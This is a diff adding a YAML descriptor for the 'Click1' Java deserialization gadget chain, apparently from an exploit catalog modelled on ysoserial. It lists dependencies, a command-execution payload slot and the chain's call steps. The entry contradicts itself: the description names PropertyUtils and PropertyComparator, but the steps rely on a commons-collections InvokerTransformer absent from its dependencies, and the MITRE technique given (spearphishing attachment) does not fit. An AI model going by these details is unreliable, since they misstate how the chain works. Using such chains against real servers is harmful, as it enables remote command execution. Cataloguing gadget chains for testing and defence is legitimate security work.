@@ -1,0 +1,24 @@
+name: "Click1"
+category: "click"
+description: "Click1 gadget chain using PropertyUtils and PropertyComparator"
+jdk_version: "all"
+dependencies:
+  - name: "click-nodeps"
+    version: "2.3.0"
+exploit_type: "command_execution"
+payload_type: "command"
+risk_level: 5
+mitre_technique: "T1566.001"
+references:
+  - "https://github.com/frohoff/ysoserial"
+steps:
+  - class_name: "org.apache.click.control.Column$ColumnComparator"
+    method_name: "compare"
+    parameters: []
+  - class_name: "org.apache.commons.collections.functors.InvokerTransformer"
+    method_name: "transform"
+    parameters:
+      - "{command}"
+  - class_name: "java.util.PriorityQueue"
+    method_name: "readObject"
+    parameters: []
